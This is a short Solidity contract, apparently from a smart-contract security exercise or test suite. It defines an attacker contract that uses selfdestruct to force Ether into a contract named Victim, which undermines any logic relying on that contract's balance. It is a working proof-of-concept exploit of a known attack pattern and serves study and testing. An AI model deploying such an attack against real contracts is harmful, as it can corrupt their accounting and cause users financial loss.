// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Victim} from "src/Victim.sol";

contract AttackSelfDestructMe {
    Victim target;

    constructor(Victim _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}